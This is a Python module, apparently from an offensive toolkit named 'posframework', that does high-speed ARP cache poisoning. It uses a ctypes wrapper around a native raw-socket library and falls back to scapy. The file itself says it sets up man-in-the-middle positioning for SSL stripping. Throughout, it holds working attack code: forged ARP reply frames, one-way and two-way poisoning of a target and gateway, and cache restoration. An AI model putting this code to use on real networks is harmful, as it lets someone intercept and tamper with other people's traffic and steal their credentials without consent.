"""
posframework.native.arp_spoof - ctypes wrapper for libarp_spoof.so

Provides high-speed ARP cache poisoning via native C raw socket
injection. Falls back to scapy ARP send() if the native library
is not compiled.

Used by mitm.py and ssl_strip.py for MITM positioning.
Requires root/CAP_NET_RAW. Linux only.
"""

import ctypes
import struct
import socket
from ctypes import c_int, c_uint8, c_size_t, c_char_p, POINTER
from typing import Optional

from posframework.config import log
from posframework.native import get_lib

# --- Native Library Setup ---

_lib = get_lib("libarp_spoof")
_USE_NATIVE = _lib is not None

if _USE_NATIVE:
    # size_t build_arp_reply(uint8_t *buf, size_t buf_size,
    #                        const uint8_t *src_mac, const uint8_t *src_ip,
    #                        const uint8_t *dst_mac, const uint8_t *dst_ip)
    _lib.build_arp_reply.argtypes = [
        POINTER(c_uint8), c_size_t,
        POINTER(c_uint8), POINTER(c_uint8),
        POINTER(c_uint8), POINTER(c_uint8),
    ]
    _lib.build_arp_reply.restype = c_size_t

    # size_t build_arp_gratuitous(uint8_t *buf, size_t buf_size,
    #                             const uint8_t *src_mac, const uint8_t *src_ip)
    _lib.build_arp_gratuitous.argtypes = [
        POINTER(c_uint8), c_size_t,
        POINTER(c_uint8), POINTER(c_uint8),
    ]
    _lib.build_arp_gratuitous.restype = c_size_t

    # int arp_open_socket(const char *iface)
    _lib.arp_open_socket.argtypes = [c_char_p]
    _lib.arp_open_socket.restype = c_int

    # void arp_close_socket(int sock_fd)
    _lib.arp_close_socket.argtypes = [c_int]
    _lib.arp_close_socket.restype = None

    # int arp_poison_burst(int sock_fd,
    #                      const uint8_t *src_mac, const uint8_t *src_ip,
    #                      const uint8_t *dst_mac, const uint8_t *dst_ip,
    #                      int count, int delay_us)
    _lib.arp_poison_burst.argtypes = [
        c_int,
        POINTER(c_uint8), POINTER(c_uint8),
        POINTER(c_uint8), POINTER(c_uint8),
        c_int, c_int,
    ]
    _lib.arp_poison_burst.restype = c_int

    # int arp_poison_bidirectional(int sock_fd,
    #                              const uint8_t *attacker_mac,
    #                              const uint8_t *target_mac, const uint8_t *target_ip,
    #                              const uint8_t *gateway_mac, const uint8_t *gateway_ip,
    #                              int count, int delay_us)
    _lib.arp_poison_bidirectional.argtypes = [
        c_int,
        POINTER(c_uint8),
        POINTER(c_uint8), POINTER(c_uint8),
        POINTER(c_uint8), POINTER(c_uint8),
        c_int, c_int,
    ]
    _lib.arp_poison_bidirectional.restype = c_int

    # int arp_restore(int sock_fd,
    #                 const uint8_t *target_mac, const uint8_t *target_ip,
    #                 const uint8_t *gateway_mac, const uint8_t *gateway_ip,
    #                 int count)
    _lib.arp_restore.argtypes = [
        c_int,
        POINTER(c_uint8), POINTER(c_uint8),
        POINTER(c_uint8), POINTER(c_uint8),
        c_int,
    ]
    _lib.arp_restore.restype = c_int

    log.debug("arp_spoof: using native C implementation")
else:
    log.warning("arp_spoof: libarp_spoof.so not available, using scapy fallback")


# --- Helper Functions ---

def _mac_to_bytes(mac: str) -> bytes:
    """Convert MAC string 'aa:bb:cc:dd:ee:ff' to 6 bytes."""
    parts = mac.lower().split(":")
    if len(parts) != 6:
        raise ValueError(f"Invalid MAC address format: {mac}")
    return bytes(int(p, 16) for p in parts)


def _mac_to_ctypes(mac: str) -> "ctypes.Array":
    """Convert MAC string to ctypes uint8 array."""
    raw = _mac_to_bytes(mac)
    return (c_uint8 * 6)(*raw)


def _ip_to_bytes(ip: str) -> bytes:
    """Convert IP string '192.168.1.1' to 4 bytes (network byte order)."""
    return socket.inet_aton(ip)


def _ip_to_ctypes(ip: str) -> "ctypes.Array":
    """Convert IP string to ctypes uint8 array (4 bytes, network order)."""
    raw = _ip_to_bytes(ip)
    return (c_uint8 * 4)(*raw)


# --- Public API ---

class ArpSpoofer:
    """
    High-speed ARP cache poisoning engine.

    Uses native C implementation for maximum injection speed.
    Falls back to scapy if native library is unavailable.

    Usage:
        spoofer = ArpSpoofer("eth0")
        spoofer.poison("192.168.1.100", "aa:bb:cc:dd:ee:ff",
                       "192.168.1.1", "11:22:33:44:55:66")
        spoofer.close()
    """

    def __init__(self, iface: str) -> None:
        self._iface = iface
        self._fd: int = -1
        self._scapy_sock = None

        if _USE_NATIVE:
            fd = _lib.arp_open_socket(iface.encode("utf-8"))
            if fd < 0:
                log.warning(f"arp_spoof: failed to open socket on {iface}, trying fallback")
                self._use_native = False
            else:
                self._fd = fd
                self._use_native = True
                log.debug(f"arp_spoof: socket fd={fd} bound to {iface}")
        else:
            self._use_native = False

    @property
    def fd(self) -> int:
        """Return underlying socket fd (-1 if not open)."""
        return self._fd

    def poison(self, target_ip: str, target_mac: str,
               spoof_ip: str, attacker_mac: str,
               count: int = 3, delay_us: int = 0) -> int:
        """
        Send ARP poison packets to target.

        Tells target that spoof_ip is at attacker_mac.

        Args:
            target_ip: Target's IP address
            target_mac: Target's MAC address
            spoof_ip: IP to impersonate (usually gateway)
            attacker_mac: Attacker's MAC address
            count: Number of packets to send
            delay_us: Delay between packets in microseconds

        Returns:
            Number of packets sent, -1 on error.
        """
        if self._use_native:
            src_mac = _mac_to_ctypes(attacker_mac)
            src_ip = _ip_to_ctypes(spoof_ip)
            dst_mac = _mac_to_ctypes(target_mac)
            dst_ip = _ip_to_ctypes(target_ip)

            result = _lib.arp_poison_burst(
                self._fd, src_mac, src_ip, dst_mac, dst_ip, count, delay_us
            )
            if result < 0:
                log.warning(f"arp_spoof: poison burst failed")
            return result
        else:
            return self._fallback_poison(target_ip, target_mac, spoof_ip, attacker_mac, count)

    def poison_bidirectional(self, attacker_mac: str,
                             target_ip: str, target_mac: str,
                             gateway_ip: str, gateway_mac: str,
                             count: int = 3, delay_us: int = 0) -> int:
        """
        Perform bidirectional ARP poisoning (target + gateway).

        Args:
            attacker_mac: Attacker's MAC address
            target_ip: Target's IP address
            target_mac: Target's MAC address
            gateway_ip: Gateway's IP address
            gateway_mac: Gateway's MAC address
            count: Number of poison rounds
            delay_us: Delay between packets

        Returns:
            Total packets sent, -1 on error.
        """
        if self._use_native:
            a_mac = _mac_to_ctypes(attacker_mac)
            t_mac = _mac_to_ctypes(target_mac)
            t_ip = _ip_to_ctypes(target_ip)
            g_mac = _mac_to_ctypes(gateway_mac)
            g_ip = _ip_to_ctypes(gateway_ip)

            result = _lib.arp_poison_bidirectional(
                self._fd, a_mac, t_mac, t_ip, g_mac, g_ip, count, delay_us
            )
            if result < 0:
                log.warning(f"arp_spoof: bidirectional poison failed")
            return result
        else:
            sent = 0
            for _ in range(count):
                sent += self._fallback_poison(target_ip, target_mac, gateway_ip, attacker_mac, 1)
                sent += self._fallback_poison(gateway_ip, gateway_mac, target_ip, attacker_mac, 1)
            return sent

    def restore(self, target_ip: str, target_mac: str,
                gateway_ip: str, gateway_mac: str,
                count: int = 5) -> int:
        """
        Restore ARP caches with correct MAC-IP mappings.

        Args:
            target_ip: Target's IP address
            target_mac: Target's real MAC address
            gateway_ip: Gateway's IP address
            gateway_mac: Gateway's real MAC address
            count: Number of restore packets per direction

        Returns:
            Total packets sent, -1 on error.
        """
        if self._use_native:
            t_mac = _mac_to_ctypes(target_mac)
            t_ip = _ip_to_ctypes(target_ip)
            g_mac = _mac_to_ctypes(gateway_mac)
            g_ip = _ip_to_ctypes(gateway_ip)

            result = _lib.arp_restore(self._fd, t_mac, t_ip, g_mac, g_ip, count)
            if result < 0:
                log.warning(f"arp_spoof: restore failed")
            return result
        else:
            return self._fallback_restore(target_ip, target_mac, gateway_ip, gateway_mac, count)

    def close(self) -> None:
        """Close the ARP socket."""
        if self._use_native and self._fd >= 0:
            _lib.arp_close_socket(self._fd)
            self._fd = -1
        if self._scapy_sock:
            try:
                self._scapy_sock.close()
            except Exception:
                pass
            self._scapy_sock = None

    def __enter__(self) -> "ArpSpoofer":
        return self

    def __exit__(self, *args) -> None:
        self.close()

    def __del__(self) -> None:
        if self._fd >= 0:
            self.close()

    # --- Fallback Implementations ---

    def _fallback_poison(self, target_ip: str, target_mac: str,
                         spoof_ip: str, attacker_mac: str, count: int) -> int:
        """ARP poison using scapy (fallback)."""
        try:
            from scapy.all import ARP, Ether, sendp
            pkt = (
                Ether(dst=target_mac, src=attacker_mac)
                / ARP(op=2, psrc=spoof_ip, hwsrc=attacker_mac,
                      pdst=target_ip, hwdst=target_mac)
            )
            sendp(pkt, iface=self._iface, count=count, verbose=False)
            return count
        except ImportError:
            log.error("arp_spoof: scapy not available for fallback")
            return -1
        except Exception as e:
            log.error(f"arp_spoof: scapy fallback error: {e}")
            return -1

    def _fallback_restore(self, target_ip: str, target_mac: str,
                          gateway_ip: str, gateway_mac: str, count: int) -> int:
        """Restore ARP using scapy (fallback)."""
        try:
            from scapy.all import ARP, Ether, sendp
            # Tell target the correct gateway MAC
            pkt1 = (
                Ether(dst=target_mac, src=gateway_mac)
                / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac,
                      pdst=target_ip, hwdst=target_mac)
            )
            # Tell gateway the correct target MAC
            pkt2 = (
                Ether(dst=gateway_mac, src=target_mac)
                / ARP(op=2, psrc=target_ip, hwsrc=target_mac,
                      pdst=gateway_ip, hwdst=gateway_mac)
            )
            sendp(pkt1, iface=self._iface, count=count, verbose=False)
            sendp(pkt2, iface=self._iface, count=count, verbose=False)
            return count * 2
        except ImportError:
            log.error("arp_spoof: scapy not available for fallback")
            return -1
        except Exception as e:
            log.error(f"arp_spoof: scapy fallback error: {e}")
            return -1


# --- Module-level convenience functions ---

def build_arp_reply(src_mac: str, src_ip: str, dst_mac: str, dst_ip: str) -> bytes:
    """
    Build an ARP reply frame (Ethernet + ARP).

    Args:
        src_mac: Sender MAC address
        src_ip: Sender IP (IP to impersonate)
        dst_mac: Target MAC address
        dst_ip: Target IP address

    Returns:
        42-byte ARP reply frame ready for raw socket injection.
    """
    if _USE_NATIVE:
        buf = (c_uint8 * 42)()
        s_mac = _mac_to_ctypes(src_mac)
        s_ip = _ip_to_ctypes(src_ip)
        d_mac = _mac_to_ctypes(dst_mac)
        d_ip = _ip_to_ctypes(dst_ip)

        frame_len = _lib.build_arp_reply(buf, 42, s_mac, s_ip, d_mac, d_ip)
        if frame_len == 0:
            return b""
        return bytes(buf[:frame_len])
    else:
        # Pure Python fallback
        frame = bytearray()
        # Ethernet: dst + src + type (ARP = 0x0806)
        frame += _mac_to_bytes(dst_mac)
        frame += _mac_to_bytes(src_mac)
        frame += struct.pack("!H", 0x0806)
        # ARP: htype(1) + ptype(0x0800) + hlen(6) + plen(4) + op(2=reply)
        frame += struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)
        frame += _mac_to_bytes(src_mac) + _ip_to_bytes(src_ip)
        frame += _mac_to_bytes(dst_mac) + _ip_to_bytes(dst_ip)
        return bytes(frame)
